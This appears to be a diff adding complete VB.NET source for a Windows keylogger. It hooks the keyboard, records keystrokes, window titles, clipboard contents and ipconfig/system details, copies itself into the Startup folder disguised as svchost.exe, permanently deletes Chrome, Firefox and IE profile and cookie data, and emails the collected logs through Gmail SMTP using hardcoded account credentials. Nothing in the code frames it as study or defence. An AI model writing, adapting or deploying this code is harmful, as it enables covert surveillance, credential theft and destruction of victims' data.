@@ -1,0 +1,299 @@
+Imports System.Text
+Imports System.IO
+Imports System.ComponentModel
+Imports System.Net.Mail
+
+
+Public Class Form1
+    Dim WithEvents K As New Keyboard
+    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
+    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
+    Private Declare Function ToUnicodeEx Lib "user32.dll" (ByVal wVirtKey As Keys, ByVal wScanCode As UInteger, ByVal lpKeyState() As Byte, ByVal pwszBuff As StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, ByVal dwhkl As IntPtr) As Integer
+    Dim strin As String = Nothing
+    Private Sub keyboardlanguages()
+        For index = 0 To InputLanguage.InstalledInputLanguages.Count - 1 Step 1
+            TextBox2.Text = InputLanguage.InstalledInputLanguages.Item(index).LayoutName.ToString + TextBox2.Text
+        Next
+    End Sub
+    Private Function getactivewindowstitle() As String
+        Dim mystr As String
+        mystr = New String(Chr(0), 100)
+        GetWindowText(GetForegroundWindow, mystr, 100)
+        mystr = mystr.Substring(0, InStr(mystr, Chr(0)) - 1)
+        Return mystr
+    End Function
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        If strin <> getactivewindowstitle() Then
+            TextBox1.Text = TextBox1.Text + vbNewLine + vbNewLine + "[" + getactivewindowstitle() + "]" + vbNewLine + "--->" + Clipboard.GetText.ToString + "<---" + vbNewLine + vbNewLine
+            strin = getactivewindowstitle()
+        End If
+    End Sub
+    Private Sub k_down(ByVal key As String) Handles K.Down
+        TextBox1.Text &= key
+    End Sub
+
+    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
+        'windows 7 startup user
+        Try
+
+            Dim file1 As String = Application.ExecutablePath
+            Dim copy1 As String = "c:\users\" + Environment.UserName.ToString + "\appdata\roaming\microsoft\windows\start menu\programs\startup\svchost.exe"
+            If File.Exists(copy1) Then
+            Else
+                System.IO.File.Copy(file1, copy1)
+            End If
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        keyboardlanguages()
+        Select Case (My.Settings.browser)
+            Case 0
+                My.Settings.browser = 1
+                My.Settings.Save()
+                My.Settings.Reload()
+            Case 1
+                Timer4.Start()
+            Case 2
+            Case Else
+        End Select
+
+        TextBox1.Text = Now() + vbNewLine + vbNewLine
+
+        Try
+            Dim myprocess As New Process()
+            myprocess.StartInfo.UseShellExecute = False
+            myprocess.StartInfo.RedirectStandardOutput = True
+            Try
+                myprocess.StartInfo.FileName = "ipconfig"
+                myprocess.StartInfo.Arguments = "/all"
+                myprocess.StartInfo.CreateNoWindow = True
+                myprocess.Start()
+                TextBox1.Text = TextBox1.Text + _
+                Replace(myprocess.StandardOutput.ReadToEnd(), _
+                Chr(13) & Chr(13), Chr(13))
+                myprocess.WaitForExit()
+            Catch ex As Win32Exception
+            End Try
+        Catch ex As Exception
+        End Try
+        Try
+            TextBox1.Text = vbNewLine + vbNewLine + TextBox1.Text + vbNewLine + vbNewLine + "user name:   " + Environment.UserName.ToString
+            TextBox1.Text = TextBox1.Text + vbNewLine + "computer Name:   " + Environment.MachineName.ToString
+            TextBox1.Text = TextBox1.Text + vbNewLine + "screen:   " + My.Computer.Screen.WorkingArea.ToString
+            TextBox1.Text = TextBox1.Text + vbNewLine + "os version:   " + Environment.OSVersion.ToString
+            TextBox1.Text = TextBox1.Text + vbNewLine + "run time:   " + Environment.Version.ToString
+            TextBox1.Text = TextBox1.Text + vbNewLine + "system root:   " + Environment.SystemDirectory.ToString
+            TextBox1.Text = TextBox1.Text + vbNewLine + "user domain Name:   " + Environment.UserName.ToString
+            TextBox1.Text = TextBox1.Text + vbNewLine + "total physical memory:   " + My.Computer.Info.TotalPhysicalMemory.ToString
+            TextBox1.Text = TextBox1.Text + vbNewLine + "remain physical memory:   " + My.Computer.Info.AvailablePhysicalMemory.ToString
+            TextBox1.Text = TextBox1.Text + vbNewLine + vbNewLine
+            K.CreateHook()
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
+        'Windows 7
+
+        'mozilla deletes folder and .ini file
+        If My.Computer.FileSystem.DirectoryExists("C:\Users\" + Environment.UserName.ToString + "AppData\roaming\mozilla\firefox\profiles.ini") Then
+            Try
+                My.Computer.FileSystem.DeleteDirectory("C:\Users\" + Environment.UserName.ToString + "AppData\roaming\mozilla\firefox\profiles.ini", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
+                System.IO.File.Delete("c:\users" + Environment.UserName.ToString + "\appdata\roaming\mozilla\firefox\profiles.ini")
+
+            Catch ex As Exception
+            End Try
+        Else
+
+        End If
+
+        'chrome deletes folder
+        If My.Computer.FileSystem.DirectoryExists("C:\Users\" + Environment.UserName.ToString + "\AppData\Local\Google\Chrome\User Data") Then
+            Try
+                My.Computer.FileSystem.DeleteDirectory("C:\Users\" + Environment.UserName.ToString + "\AppData\Local\Google\Chrome\User Data", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
+            Catch ex As Exception
+            End Try
+        Else
+
+        End If
+
+        'IE delete folder
+
+        If My.Computer.FileSystem.DirectoryExists("C:\Users\" + Environment.UserName.ToString + "\AppData\Roaming\Microsoft\Windows\Cookies") Then
+            Try
+                My.Computer.FileSystem.DeleteDirectory("C:\Users\" + Environment.UserName.ToString + "\AppData\Roaming\Microsoft\Windows\Cookies", FileIO.UIOption.OnlyErrorDialogs, FileIO.RecycleOption.DeletePermanently)
+            Catch ex As Exception
+            End Try
+        Else
+
+        End If
+
+        My.Settings.browser = 2
+        My.Settings.Save()
+        My.Settings.Reload()
+        Timer4.Stop()
+    End Sub
+
+    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
+        Try
+            Dim mymailmessage As New mailmessage()
+            mymailmessage.From = New MailAddress("wendoessps1ceven7@gmail.com")
+            mymailmessage.To.Add("wendoessps1ceven7@gmail.com")
+            mymailmessage.Subject = Environment.UserName.ToString + "turned off part:" + My.Settings.part.ToString
+            mymailmessage.body = TextBox1.Text
+            Dim SMTpServer As New SmtpClient("smtp.gmail.com")
+            SMTpServer.port = 587
+            SMTpServer.Credentials = New System.Net.NetworkCredential("wendoessps1ceven7@gmail.com", "wendoesSPS17")
+            SMTpServer.EnableSsl = True
+            SMTpServer.send(mymailmessage)
+        Catch ex As Exception
+        End Try
+        My.Settings.part = My.Settings.part + 1
+        My.Settings.Save()
+        My.Settings.Reload()
+    End Sub
+
+    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
+        Try
+            Timer1.Stop()
+            Dim mymailmessage As New MailMessage()
+            mymailmessage.From = New MailAddress("wendoessps1ceven7@gmail.com")
+            mymailmessage.To.Add("wendoessps1ceven7@gmail.com")
+            mymailmessage.Subject = Environment.UserName.ToString + "part:" + My.Settings.part.ToString + My.Settings.part.ToString + TextBox2.Text
+            'sent this
+            mymailmessage.Body = "compare info: " + My.Computer.Info.InstalledUICulture.CompareInfo.ToString + vbNewLine +
+            "display name: " + My.Computer.Info.InstalledUICulture.DisplayName.ToString + vbNewLine +
+            "english name: " + My.Computer.Info.InstalledUICulture.DisplayName.ToString + vbNewLine +
+            "left language tag: " + My.Computer.Info.InstalledUICulture.IetfLanguageTag.ToString + vbNewLine +
+            "name: " + My.Computer.Info.InstalledUICulture.Name.ToString + vbNewLine +
+            "native name: " + My.Computer.Info.InstalledUICulture.NativeName.ToString + vbNewLine +
+            "text info: " + My.Computer.Info.InstalledUICulture.TextInfo.ToString + vbNewLine +
+            "3 letter ISOlanguage name: " + My.Computer.Info.InstalledUICulture.ThreeLetterISOLanguageName.ToString + vbNewLine +
+            "3 letter windows language name: " + My.Computer.Info.InstalledUICulture.ThreeLetterISOLanguageName.ToString + vbNewLine +
+            "2 letter ISO language name: " + My.Computer.Info.InstalledUICulture.TwoLetterISOLanguageName.ToString + vbNewLine + vbNewLine + vbNewLine + TextBox1.Text
+            Dim SMTpServer As New SmtpClient("smtp.gmail.com")
+
+            SMTpServer.Port = 587
+            SMTpServer.Credentials = New System.Net.NetworkCredential("wendoessps1ceven7@gmail.com", "wendoesSPS17")
+            SMTpServer.EnableSsl = True
+            SMTpServer.Send(mymailmessage)
+            TextBox1.Clear()
+            Timer1.Start()
+        Catch ex As Exception
+        End Try
+        My.Settings.part = My.Settings.part + 1
+        My.Settings.Save()
+        My.Settings.Reload()
+    End Sub
+End Class
+
+
+keyboard languages class
+
+
+Public Class Keyboard
+    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal Hook As Integer, ByVal KeyDelegate As KDel, ByVal HMod As Integer, ByVal ThreadId As Integer) As Integer
+    Private Declare Function CallNextHookEx Lib "user32" (ByVal Hook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
+    Private Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal Hook As Integer) As Integer
+    Private Delegate Function KDel(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
+    Public Shared Event Down(ByVal Key As String)
+    Public Shared Event Up(ByVal Key As String)
+    Private Shared Key As Integer
+    Private Shared KHD As KDel
+    Private Structure KeyStructure : Public Code As Integer : Public ScanCode As Integer : Public Flags As Integer : Public Time As Integer : Public ExtraInfo As Integer : End Structure
+    Public Sub CreateHook()
+        KHD = New KDel(AddressOf Proc)
+        Key = SetWindowsHookEx(13, KHD, System.Runtime.InteropServices.Marshal.GetHINSTANCE(System.Reflection.Assembly.GetExecutingAssembly.GetModules()(0)).ToInt32, 0)
+    End Sub
+
+    Private Function Proc(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KeyStructure) As Integer
+        If (Code = 0) Then
+            Select Case wParam
+                Case &H100, &H104 : RaiseEvent Down(Feed(CType(lParam.Code, Keys)))
+                Case &H101, &H105 : RaiseEvent Up(Feed(CType(lParam.Code, Keys)))
+            End Select
+        End If
+        Return CallNextHookEx(Key, Code, wParam, lParam)
+    End Function
+    Public Sub DiposeHook()
+        UnhookWindowsHookEx(Key)
+        MyBase.Finalize()
+    End Sub
+    Private Function Feed(ByVal e As Keys) As String
+        Select Case e
+            Case 65 To 90
+                If Control.IsKeyLocked(Keys.CapsLock) Or (Control.ModifierKeys And Keys.Shift) <> 0 Then
+                    Return e.ToString
+                Else
+                    Return e.ToString.ToLower
+                End If
+            Case 48 To 57
+                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
+                    Select Case e.ToString
+                        Case "D1" : Return "!"
+                        Case "D2" : Return "@"
+                        Case "D3" : Return "#"
+                        Case "D4" : Return "$"
+                        Case "D5" : Return "%"
+                        Case "D6" : Return "^"
+                        Case "D7" : Return "&"
+                        Case "D8" : Return "*"
+                        Case "D9" : Return "("
+                        Case "D0" : Return ")"
+                    End Select
+                Else
+                    Return e.ToString.Replace("D", Nothing)
+                End If
+            Case 96 To 105
+                Return e.ToString.Replace("NumPad", Nothing)
+            Case 106 To 111
+                Select Case e.ToString
+                    Case "Divide" : Return "/"
+                    Case "Multiply" : Return "*"
+                    Case "Subtract" : Return "-"
+                    Case "Add" : Return "+"
+                    Case "Decimal" : Return "."
+                End Select
+            Case 32
+                Return " "
+            Case 186 To 222
+                If (Control.ModifierKeys And Keys.Shift) <> 0 Then
+                    Select Case e.ToString
+                        Case "OemMinus" : Return "_"
+                        Case "Oemplus" : Return "+"
+                        Case "OemOpenBrackets" : Return "{"
+                        Case "Oem6" : Return "}"
+                        Case "Oem5" : Return "|"
+                        Case "Oem1" : Return ":"
+                        Case "Oem7" : Return """"
+                        Case "Oemcomma" : Return "<"
+                        Case "OemPeriod" : Return ">"
+                        Case "OemQuestion" : Return "?"
+                        Case "Oemtilde" : Return "~"
+                    End Select
+                Else
+                    Select Case e.ToString
+                        Case "OemMinus" : Return "-"
+                        Case "Oemplus" : Return "="
+                        Case "OemOpenBrackets" : Return "["
+                        Case "Oem6" : Return "]"
+                        Case "Oem5" : Return ""
+                        Case "Oem1" : Return ";"
+                        Case "Oem7" : Return "'"
+                        Case "Oemcomma" : Return ","
+                        Case "OemPeriod" : Return "."
+                        Case "OemQuestion" : Return "/"
+                        Case "Oemtilde" : Return "`"
+                    End Select
+                End If
+            Case Keys.Return
+                Return Environment.NewLine
+            Case Else
+                Return "<" + e.ToString + ">"
+        End Select
+        Return Nothing
+    End Function
+End Class
